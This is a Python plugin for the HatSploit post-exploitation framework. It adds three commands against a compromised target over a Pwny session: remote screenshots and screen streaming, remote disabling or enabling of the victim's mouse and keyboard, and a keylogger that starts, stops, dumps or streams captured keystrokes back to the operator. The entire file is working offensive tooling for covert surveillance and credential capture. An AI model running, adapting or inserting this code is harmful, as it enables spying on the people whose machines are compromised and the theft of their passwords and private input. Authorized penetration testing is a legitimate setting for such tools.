"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import os
import sys
import threading

from pwny.api import *
from pwny.types import *

from pex.proto.stream import StreamClient

from badges.cmd import Command
from hatsploit.lib.core.plugin import Plugin


# ---- ui_screenshot tags/types (API_CALL) ----

UI_SCREENSHOT = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL)
UI_PIPE = tlv_custom_pipe(PIPE_STATIC, TAB_BASE, PIPE_TYPE)

# ---- uictl tags/types (API_CALL + 1, +2) ----

UICTL_SET = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 1)
UICTL_GET = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 2)

UICTL_DEVICE = tlv_custom_type(TLV_TYPE_INT, TAB_BASE, API_TYPE)
UICTL_ENABLE = tlv_custom_type(TLV_TYPE_INT, TAB_BASE, API_TYPE + 1)

UICTL_MOUSE = 0
UICTL_KEYBOARD = 1
UICTL_ALL = 2

DEVICE_MAP = {
    'mouse': UICTL_MOUSE,
    'keyboard': UICTL_KEYBOARD,
    'all': UICTL_ALL,
}

# ---- keyscan tags/types (API_CALL + 3, +4, +5) ----

KEYSCAN_START = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 3)
KEYSCAN_STOP = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 4)
KEYSCAN_DUMP = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 5)

TLV_TYPE_KEYSCAN_DATA = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 2)

# ---- keyscan streaming pipe ----

KEYSCAN_PIPE = tlv_custom_pipe(PIPE_STATIC, TAB_BASE, PIPE_TYPE + 1)


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__({
            'Name': "UI Plugin",
            'Plugin': "ui",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - plugin developer',
                'EntySec - Windows implementation',
            ],
            'Description': (
                "Screenshot/streaming, input device control, "
                "and keystroke capture."
            ),
        })

        self.commands = [
            Command({
                'Category': "gather",
                'Name': "screen",
                'Description': "Stream screen or take screenshot.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('-s', '--snap'),
                        {
                            'help': "Take a screenshot from device.",
                            'action': 'store_true',
                        }
                    ),
                    (
                        ('-S', '--stream'),
                        {
                            'help': "Stream selected device.",
                            'action': 'store_true',
                        }
                    ),
                    (
                        ('-o', '--output'),
                        {
                            'help': "Local file to save screenshot to.",
                            'metavar': 'FILE',
                        }
                    ),
                ]
            }),
            Command({
                'Category': "manage",
                'Name': "uictl",
                'Description': "Control user input devices (mouse/keyboard).",
                'MinArgs': 1,
                'Options': [
                    (
                        ('-e', '--enable'),
                        {
                            'help': "Enable a device (mouse, keyboard, all).",
                            'metavar': 'DEVICE',
                            'choices': ['mouse', 'keyboard', 'all']
                        }
                    ),
                    (
                        ('-d', '--disable'),
                        {
                            'help': "Disable a device (mouse, keyboard, all).",
                            'metavar': 'DEVICE',
                            'choices': ['mouse', 'keyboard', 'all']
                        }
                    ),
                    (
                        ('-s', '--status'),
                        {
                            'help': "Get status for a device (mouse, keyboard).",
                            'metavar': 'DEVICE',
                            'choices': ['mouse', 'keyboard']
                        }
                    )
                ]
            }),
            Command({
                'Category': "gather",
                'Name': "keyscan",
                'Description': "Capture keystrokes on the target.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('action',),
                        {
                            'help': "Action: start, stop, dump, or stream.",
                            'choices': ['start', 'stop', 'dump', 'stream'],
                        }
                    ),
                    (
                        ('-o', '--output'),
                        {
                            'help': "Save keystrokes to local file.",
                            'metavar': 'FILE',
                        }
                    ),
                ]
            }),
        ]

        self.stop = False
        self.keyscan_pipe_id = None
        self.keyscan_log_fd = None
        self.keyscan_streaming = False

    # ---- screen handler ----

    def read_thread(self, path, pipe_id):
        while not self.stop:
            try:
                frame = self.session.pipes.readall_pipe(
                    pipe_type=UI_PIPE,
                    pipe_id=pipe_id,
                    plugin=self.plugin
                )
            except Exception:
                break

            try:
                with open(path, 'wb') as f:
                    f.write(frame)
            except Exception:
                self.print_error(f"Failed to write image to {path}!")

    def screen(self, args):
        if args.stream:
            try:
                pipe_id = self.session.pipes.create_pipe(
                    pipe_type=UI_PIPE,
                    plugin=self.plugin
                )
            except RuntimeError:
                self.print_error("Failed to open screen pipe!")
                return

            file = self.session.loot.random_loot('bmp')
            path = self.session.loot.random_loot('html')

            self.stop = False
            thread = threading.Thread(target=self.read_thread,
                                      args=(file, pipe_id))
            thread.setDaemon(True)
            thread.start()

            client = StreamClient(path=path, image=file)
            client.create_video()

            self.print_process("Streaming screen...")
            self.print_information("Press Ctrl-C to stop.")

            try:
                client.stream()
                for _ in sys.stdin:
                    pass

            except KeyboardInterrupt:
                self.print_process("Stopping stream...")

            self.stop = True
            thread.join()

            self.session.pipes.destroy_pipe(UI_PIPE, pipe_id,
                                             plugin=self.plugin)
            self.session.loot.remove_loot(file)
            self.session.loot.remove_loot(path)

        elif args.snap:
            result = self.session.send_command(
                tag=UI_SCREENSHOT,
                plugin=self.plugin
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Failed to take screenshot!")
                return

            frame = result.get_raw(TLV_TYPE_BYTES)

            if args.output:
                path = args.output
            else:
                path = self.session.loot.random_loot('bmp')

            try:
                with open(path, 'wb') as f:
                    f.write(frame)

                self.print_success(f"Screenshot saved to {path}!")

            except Exception:
                self.print_error(f"Failed to write image to {path}!")

        else:
            self.print_usage()

    # ---- uictl handler ----

    def uictl(self, args):
        if args.enable:
            device = DEVICE_MAP[args.enable]

            result = self.session.send_command(
                tag=UICTL_SET,
                plugin=self.plugin,
                args={
                    UICTL_DEVICE: device,
                    UICTL_ENABLE: 1,
                }
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error(f"Failed to enable {args.enable}!")
                return

            self.print_success(f"Successfully enabled {args.enable}.")

        elif args.disable:
            device = DEVICE_MAP[args.disable]

            result = self.session.send_command(
                tag=UICTL_SET,
                plugin=self.plugin,
                args={
                    UICTL_DEVICE: device,
                    UICTL_ENABLE: 0,
                }
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error(f"Failed to disable {args.disable}!")
                return

            self.print_success(f"Successfully disabled {args.disable}.")

        elif args.status:
            device = DEVICE_MAP[args.status]

            result = self.session.send_command(
                tag=UICTL_GET,
                plugin=self.plugin,
                args={
                    UICTL_DEVICE: device,
                }
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error(f"Failed to get status for {args.status}!")
                return

            enabled = result.get_int(UICTL_ENABLE)
            state = "enabled" if enabled else "disabled"

            self.print_information(f"{args.status.capitalize()}: {state}")

        else:
            self.print_usage()

    # ---- keyscan handler ----

    def _keyscan_event(self, packet):
        """Pipe event callback — fired when keystrokes arrive from the C side."""

        data = packet.get_raw(PIPE_TYPE_BUFFER)
        if not data:
            return

        text = data.decode('utf-8', errors='replace')

        # Write to log file if active
        if self.keyscan_log_fd is not None:
            try:
                self.keyscan_log_fd.write(text)
                self.keyscan_log_fd.flush()
            except Exception:
                pass

        # Print to stdout if streaming
        if self.keyscan_streaming:
            sys.stdout.write(text)
            sys.stdout.flush()

    def _keyscan_create_pipe(self):
        """Create keyscan pipe and register event callback."""

        if self.keyscan_pipe_id is not None:
            return  # already active

        try:
            self.keyscan_pipe_id = self.session.pipes.create_pipe(
                pipe_type=KEYSCAN_PIPE,
                plugin=self.plugin
            )
        except RuntimeError:
            self.print_error("Failed to open keyscan pipe!")
            return

        self.session.pipes.create_event(
            pipe_type=KEYSCAN_PIPE,
            pipe_id=self.keyscan_pipe_id,
            pipe_data=PIPE_TYPE_BUFFER,
            target=self._keyscan_event,
            plugin=self.plugin
        )

    def _keyscan_destroy_pipe(self):
        """Destroy keyscan pipe (auto-unregisters events)."""

        if self.keyscan_pipe_id is None:
            return

        try:
            self.session.pipes.destroy_pipe(
                KEYSCAN_PIPE, self.keyscan_pipe_id,
                plugin=self.plugin
            )
        except Exception:
            pass

        self.keyscan_pipe_id = None

    def keyscan(self, args):
        if args.action == 'start':
            result = self.session.send_command(
                tag=KEYSCAN_START,
                plugin=self.plugin,
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Failed to start keylogger!")
                return

            self.print_success("Keylogger started.")

            if args.output:
                try:
                    self.keyscan_log_fd = open(args.output, 'a')
                except Exception:
                    self.print_error(f"Failed to open {args.output}!")
                    return

                self._keyscan_create_pipe()

                self.print_information(
                    f"Logging keystrokes to {args.output} (event-driven)."
                )

        elif args.action == 'stop':
            # Close log file
            if self.keyscan_log_fd is not None:
                log_path = self.keyscan_log_fd.name
                self.keyscan_log_fd.close()
                self.keyscan_log_fd = None
                self.print_information(f"Log saved to {log_path}")

            self.keyscan_streaming = False
            self._keyscan_destroy_pipe()

            result = self.session.send_command(
                tag=KEYSCAN_STOP,
                plugin=self.plugin,
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Failed to stop keylogger!")
                return

            self.print_success("Keylogger stopped.")

        elif args.action == 'dump':
            result = self.session.send_command(
                tag=KEYSCAN_DUMP,
                plugin=self.plugin,
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Keylogger not running or dump failed!")
                return

            data = result.get_string(TLV_TYPE_KEYSCAN_DATA)

            if not data:
                self.print_warning("No keystrokes captured yet.")
                return

            self.print_information(data)

            if args.output:
                try:
                    with open(args.output, 'a') as f:
                        f.write(data + '\n')

                    self.print_success(f"Keystrokes appended to {args.output}")
                except Exception:
                    self.print_error(f"Failed to write to {args.output}!")

        elif args.action == 'stream':
            if args.output:
                try:
                    self.keyscan_log_fd = open(args.output, 'a')
                except Exception:
                    self.print_error(f"Failed to open {args.output}!")
                    return

                self.print_information(f"Logging keystrokes to {args.output}")

            self._keyscan_create_pipe()

            if self.keyscan_pipe_id is None:
                if self.keyscan_log_fd:
                    self.keyscan_log_fd.close()
                    self.keyscan_log_fd = None
                return

            self.keyscan_streaming = True

            self.print_process("Streaming keystrokes (Ctrl-C to stop)...")

            try:
                while True:
                    threading.Event().wait(0.5)
            except KeyboardInterrupt:
                self.print_process("Stopping keyscan stream...")

            self.keyscan_streaming = False

            if self.keyscan_log_fd:
                self.keyscan_log_fd.close()
                self.keyscan_log_fd = None

            self._keyscan_destroy_pipe()
            self.print_success("Keyscan stream stopped.")

    def load(self):
        pass
